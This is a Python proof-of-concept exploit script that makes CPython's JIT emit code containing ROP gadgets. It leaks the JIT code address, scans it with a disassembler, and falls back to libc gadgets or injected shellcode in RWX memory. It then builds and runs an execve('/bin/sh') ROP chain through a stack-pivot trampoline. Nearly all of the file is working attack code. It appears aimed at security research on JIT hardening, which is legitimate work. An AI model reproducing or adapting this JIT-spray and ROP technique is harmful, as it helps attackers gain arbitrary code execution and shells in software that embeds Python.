#!/usr/bin/env python3
import ctypes
import mmap
import struct
import json
import types
from capstone import *
import jitexecleak
from libc_gadget_finder import get_runtime_gadget_addresses

PAGE_SIZE = 0x1000

# MAGIC_VALUES updated to emphasize short, high-frequency instruction bytes observed
# in CPython JIT stencils rather than shellcode-derived 4-byte chunks.
MAGIC_VALUES = [
    0x000000C3,  # ret
    0x00005FC3,  # pop rdi; ret
    0x00005EC3,  # pop rsi; ret
    0x00005AC3,  # pop rdx; ret
    0x00005BC3,  # pop rbx; ret (temporary storage helper)
    0x000031D2,  # xor edx, edx
    0x004831C0,  # xor rax, rax
]

def allocate_rwx(size=PAGE_SIZE):
    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.restype = ctypes.c_void_p
    addr = libc.mmap(None, size, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                     mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, -1, 0)
    if addr == -1:
        raise RuntimeError("mmap failed")
    return addr

def generate_jit_func_named(seed, magic_value):
    code = f"""
def f(x):
    # Nested helper to trigger CALL-related stencils
    def h(a, b):
        return (a ^ b) & 0xFFFFFFFF

    # Dictionary and object operations to trigger STORE_SUBSCR_DICT, LOAD_ATTR, COMPARE_OP stencils
    d = {{}}
    class Obj:
        val = 0

    obj = Obj()
    acc = x
    for i in range({3000 + seed * 500}):
        acc ^= ({magic_value} + (i << (i % 8)))
        acc = ((acc << (i % 5)) | (acc >> (32 - (i % 5)))) & 0xFFFFFFFF
        acc += ({magic_value} >> (i % 16))
        acc *= 3 + (i % 4)
        acc ^= (acc >> ((i+3) % 8))
        acc ^= ({magic_value} + i) * ((acc >> 3) & 0xff)
        acc += (i ^ {magic_value})
        
        # Trigger various stencils
        acc = h(acc, i & 0xff)
        
        if i % 100 == 0:
            d[i] = acc & 0xff
            acc ^= d.get(i, 0)
        
        if i % 200 == 0:
            obj.val = acc & 0xffff
            acc += obj.val
        
        if acc > {magic_value}:
            acc -= 1
        elif acc < (i & 0xff):
            acc += 1
    
    return acc
"""
    scope = {}
    exec(code, scope)
    return scope['f']

def find_gadgets(jit_addr, blob, gadgets_needed):
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    found = {}
    for i in range(len(blob) - 10):
        insns = list(md.disasm(blob[i:i+10], jit_addr + i))
        if len(insns) >= 2:
            for mnemonic, operand in gadgets_needed:
                key = f"{mnemonic} {operand}".strip()
                if key in found:
                    continue
                
                # Standard pop/syscall gadgets followed by ret
                if (insns[0].mnemonic == mnemonic and operand in insns[0].op_str and
                    insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                    found[key] = insns[0].address
                
                # Special handling for xor edx, edx; ret
                elif (mnemonic == "xor" and operand == "edx, edx" and
                      insns[0].mnemonic == "xor" and "edx" in insns[0].op_str and
                      insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                    found[key] = insns[0].address
                
                # pop rbx; ret
                elif (mnemonic == "pop" and operand == "rbx" and
                      insns[0].mnemonic == "pop" and "rbx" in insns[0].op_str and
                      insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                    found[key] = insns[0].address
    
    return found

def provide_gadget_shellcode(mnemonic, operand=""):
    shellcodes = {
        "pop rax": b"\x58\xc3",
        "pop rdi": b"\x5f\xc3",
        "pop rsi": b"\x5e\xc3",
        "pop rdx": b"\x5a\xc3",
        "syscall": b"\x0f\x05",    # No ret needed - execve replaces process!
    }
    key = f"{mnemonic} {operand}".strip()
    addr = allocate_rwx()
    ctypes.memmove(addr, shellcodes[key], len(shellcodes[key]))
    return addr

def allocate_binsh():
    binsh_str = b"/bin/sh\x00"
    addr = allocate_rwx()
    ctypes.memmove(addr, binsh_str, len(binsh_str))
    return addr

def generate_spread_jit_functions(num_functions, gadgets_needed):
    """
    넓은 주소 영역에 JIT 함수 분산 생성 (test_runtime_jit_scan.py 전략)
    
    전략:
    1. 여러 모듈 생성 (메모리 할당 경계 분리)
    2. 각 모듈에 함수 분산 배치
    3. 1MB 더미로 메모리 영역 강제 분산
    4. 같은 프로세스 내에서 모든 gadget 주소 유효
    """
    num_modules = min(10, num_functions)  # 최대 10개 모듈
    funcs_per_module = max(1, num_functions // num_modules)
    
    modules = []
    all_functions = []
    all_gadgets = {}
    
    print(f"\n[*] Generating {num_functions} functions across {num_modules} modules...")
    print(f"[*] Strategy: Spread allocation in same process")
    print(f"[*] Expected: Wide address space distribution for diverse patch_64 values")
    
    for mod_idx in range(num_modules):
        # 새 모듈 생성 (Python 네임스페이스 분리)
        module = types.ModuleType(f"jit_spread_module_{mod_idx}")
        modules.append(module)
        
        print(f"\n[Module {mod_idx}] Creating module with {funcs_per_module} functions...")
        
        # 각 모듈에 함수 생성
        for i in range(funcs_per_module):
            global_idx = mod_idx * funcs_per_module + i
            if global_idx >= num_functions:
                break
                
            magic_value = MAGIC_VALUES[global_idx % len(MAGIC_VALUES)]
            
            print(f"  [{mod_idx}.{i}] Generating function with magic 0x{magic_value:08X}...")
            jit_func = generate_jit_func_named(global_idx, magic_value)
            
            # 모듈에 등록 (메모리 할당 분산 효과)
            setattr(module, f"func_{i}", jit_func)
            all_functions.append((global_idx, jit_func, magic_value))
            
            # Warm up
            print(f"  [{mod_idx}.{i}] Warming up...")
            for j in range(5000):
                jit_func(j)
            
            # JIT 메모리 접근 및 gadget 스캔
            try:
                jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
                print(f"  [{mod_idx}.{i}] ✓ JIT @ {hex(jit_addr)}, size: {size}")
                
                blob = (ctypes.c_ubyte * size).from_address(jit_addr)
                found_gadgets = find_gadgets(jit_addr, bytes(blob), gadgets_needed)
                
                for key, addr in found_gadgets.items():
                    if key not in all_gadgets:
                        all_gadgets[key] = addr
                        print(f"  [{mod_idx}.{i}] Found gadget: {key} @ {hex(addr)}")
                
            except RuntimeError as e:
                print(f"  [{mod_idx}.{i}] ✗ JIT compilation failed: {e}")
        
        # 메모리 할당 경계 강제 (다음 모듈이 다른 주소에 할당되도록)
        if mod_idx < num_modules - 1:
            dummy = bytearray(1024 * 1024)  # 1MB 더미
            print(f"[Module {mod_idx}] Memory boundary enforced (1MB dummy)")
    
    print(f"\n[+] Total functions created: {len(all_functions)}")
    print(f"[+] Functions spread across {len(modules)} modules")
    print(f"[+] Gadgets found from JIT: {len(all_gadgets)}")
    
    return all_gadgets, modules

def execute_rop_chain(gadgets):
    binsh_addr = allocate_binsh()
    stub = allocate_rwx()
    stack = allocate_rwx(0x1000)

    chain = [
        gadgets["pop rax"], 59,
        gadgets["pop rdi"], binsh_addr,
        gadgets["pop rsi"], 0,
        gadgets["pop rdx"], 0,
        gadgets["syscall"]
    ]

    print("\n=== [ ROP Stack Layout ] ===")
    for i, val in enumerate(chain):
        ctypes.c_uint64.from_address(stack + i * 8).value = val
        print(f"[Stack +{i*8:#04x}] = {hex(val)}")

    first_gadget_addr = chain[0]
    stack_after_first_gadget = stack + 8

    trampoline = b"\x48\xbc" + struct.pack("<Q", stack_after_first_gadget)
    trampoline += b"\x48\xb8" + struct.pack("<Q", first_gadget_addr)
    trampoline += b"\xff\xe0"
    ctypes.memmove(stub, trampoline, len(trampoline))

    print("\n=== [ Trampoline Info ] ===")
    print(f"[Trampoline Address]      = {hex(stub)}")
    print(f"[Trampoline Bytes]        = {trampoline.hex()}")
    print(f"[Stack Base Address]      = {hex(stack)}")
    print(f"[RSP after 1st gadget]    = {hex(stack_after_first_gadget)}")

    input("\nPress Enter to execute ROP chain...\n")
    fn = ctypes.CFUNCTYPE(None)(stub)
    fn()

def main():
    import os
    
    # Load stencil stats if available
    try:
        with open("stencil_gadgets.json", 'r') as f:
            data = json.load(f)
        print("[stencil-json] summary ret count=", data['summary'].get('ret'))
        print("[stencil-json] pop_rdi_ret present?", 
              any('pop_rdi_ret' in v for v in data.get('per_func', {}).values()))
    except:
        print("[stencil-json] not found or unreadable")

    gadgets_needed = [
        ("pop", "rax"),
        ("pop", "rdi"),
        ("pop", "rsi"),
        ("pop", "rdx"),
        ("syscall", ""),
        ("xor", "edx, edx"),
    ]

    # ===== STEP 1: Search in JIT code with SPREAD allocation =====
    print("\n" + "="*70)
    print("SPREAD ALLOCATION STRATEGY")
    print("="*70)
    print("Goal: Distribute JIT code across wide address space")
    print("Method: Multiple modules + 1MB dummy boundaries")
    print("Benefit: Diverse patch_64 values → More unintended instructions")
    print("="*70)
    
    # 함수 개수 설정 (7개: MAGIC_VALUES 개수만큼)
    num_functions = len(MAGIC_VALUES)
    
    # Spread allocation으로 JIT 함수 생성 및 gadget 스캔
    found_gadgets_global, modules = generate_spread_jit_functions(num_functions, gadgets_needed)
    
    print(f"\n[+] JIT gadgets collected: {len(found_gadgets_global)}")
    
    # ===== STEP 2: Check what's missing and search in libc =====
    missing_gadgets = []
    for mnemonic, operand in gadgets_needed:
        key = f"{mnemonic} {operand}".strip()
        if key.lower() != "xor edx, edx" and key not in found_gadgets_global:
            missing_gadgets.append(key)
    
    if missing_gadgets:
        print(f"\n[!] Missing gadgets from JIT: {missing_gadgets}")
        print("[*] Searching in libc as fallback...")
        
        try:
            libc_gadgets, libc_base = get_runtime_gadget_addresses()
            print(f"[+] Found {len(libc_gadgets)} gadgets in libc (base: {hex(libc_base)})")
            
            # Map libc gadgets to our naming convention (only for missing ones)
            libc_mapping = {
                'pop rax': 'pop_rax_ret',
                'pop rdi': 'pop_rdi_ret',
                'pop rsi': 'pop_rsi_ret',
                'pop rdx': 'pop_rdx_ret',
                'syscall': ['syscall', 'syscall_ret'],  # Prefer bare syscall (execve doesn't return!)
            }
            
            for key in missing_gadgets:
                libc_key = libc_mapping.get(key)
                
                # Handle syscall special case (try multiple keys)
                if isinstance(libc_key, list):
                    for lk in libc_key:
                        if lk in libc_gadgets:
                            found_gadgets_global[key] = libc_gadgets[lk]
                            print(f"[+] libc: {key} @ {hex(libc_gadgets[lk])} [{lk}]")
                            break
                elif libc_key and libc_key in libc_gadgets:
                    found_gadgets_global[key] = libc_gadgets[libc_key]
                    print(f"[+] libc: {key} @ {hex(libc_gadgets[libc_key])}")
                    
        except Exception as e:
            print(f"[!] libc gadget discovery failed: {e}")
    else:
        print("\n[+] All gadgets found in JIT! No need for libc search.")
    
    # Fill gaps with shellcode
    remaining_gadgets = set(f"{m} {o}".strip() for m, o in gadgets_needed)
    for key in remaining_gadgets:
        if key.strip().lower() == "xor edx, edx":
            continue
        if key not in found_gadgets_global:
            mnemonic, operand = key.split() if ' ' in key else (key, "")
            print(f"[!] Gadget {key} not found, providing shellcode.")
            found_gadgets_global[key] = provide_gadget_shellcode(mnemonic, operand)

    print("\n=== [ All Found Gadgets ] ===")
    for key, addr in found_gadgets_global.items():
        print(f"[+] {key:<12} => {hex(addr)}")

    # Execute
    dry_run = False
    if dry_run:
        print("\n[DRY-RUN] Skipping ROP chain execution.")
    else:
        execute_rop_chain(found_gadgets_global)

if __name__ == "__main__":
    main()
